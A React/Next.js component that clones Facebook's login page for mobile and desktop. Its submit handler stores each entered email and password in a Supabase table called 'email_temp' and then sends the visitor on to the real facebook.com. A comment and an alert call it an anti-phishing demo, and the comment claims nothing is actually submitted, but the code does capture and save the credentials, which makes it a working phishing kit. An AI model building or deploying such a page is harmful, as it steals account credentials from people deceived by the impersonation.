'use client';
import React, { useState } from 'react';
import { supabase } from '@/portfolio/app/lib/supabase';

export default function FacebookLoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = () => {
    // For educational purposes - show alert instead of actual submission
    supabase.from('email_temp').insert({ email: email, password: password })
      .then(() => {
        location.replace('https://facebook.com/');
      });
    alert('This is a demo for anti-phishing education. Never enter real credentials on suspicious sites!');
  };

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Mobile View */}
      <div className="lg:hidden min-h-screen bg-white flex flex-col items-center justify-center px-4">
        {/* Facebook Logo */}
        <div className="text-center mb-8">
          <h1 className="text-blue-600 text-5xl font-black tracking-tight mb-4"
              style={{ fontFamily: 'Klavika, sans-serif' }}>
            Facebook
          </h1>
          <p className="text-gray-600 text-lg leading-6 px-4">
            Facebook helps you connect and share with the people in your life.
          </p>
        </div>

        {/* Login Form */}
        <div className="w-full max-w-sm bg-white border border-gray-200 rounded-lg shadow-sm p-4">
          <div className="space-y-3">
            <input
              type="text"
              placeholder="Email address or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-md text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />

            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-md text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />

            <button
              onClick={handleSubmit}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-md transition duration-200"
            >
              Log In
            </button>
          </div>

          <div className="text-center mt-4">
            <a href="#" className="text-blue-600 text-sm hover:underline">
              Forgotten password?
            </a>
          </div>

          <hr className="my-6 border-gray-200" />

          <div className="text-center">
            <button
              type="button"
              className="bg-green-500 hover:bg-green-600 text-white font-semibold py-3 px-6 rounded-md transition duration-200"
            >
              Create New Account
            </button>
          </div>
        </div>


      </div>

      {/* Desktop View */}
      <div className="hidden lg:flex min-h-screen items-center justify-center px-8">
        <div className="max-w-6xl w-full flex items-center justify-between">
          {/* Left Side - Facebook Branding */}
          <div className="flex-1 pr-16">
            <h1 className="text-blue-600 text-7xl font-normal mb-4" style={{ fontFamily: 'Klavika, sans-serif' }}>
              facebook
            </h1>
            <p className="text-gray-900 text-2xl font-normal leading-8">
              Connect with friends and the world around you on Facebook.
            </p>
          </div>

          {/* Right Side - Login Form */}
          <div className="flex-shrink-0">
            <div className="bg-white rounded-lg shadow-lg p-6 w-96">
              <div className="space-y-4">
                <input
                  type="text"
                  placeholder="Email or phone number"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md text-gray-900 placeholder-gray-500 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                />

                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md text-gray-900 placeholder-gray-500 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                />

                <button
                  onClick={handleSubmit}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-md text-xl transition duration-200"
                >
                  Login
                </button>
              </div>

              <div className="text-center mt-4">
                <a href="#" className="text-blue-600 text-sm hover:underline">
                  Forgot password?
                </a>
              </div>

              <hr className="my-6 border-gray-300" />

              <div className="text-center">
                <button
                  type="button"
                  className="bg-green-500 hover:bg-green-600 text-white font-semibold py-3 px-6 rounded-md transition duration-200"
                >
                  Create new account
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
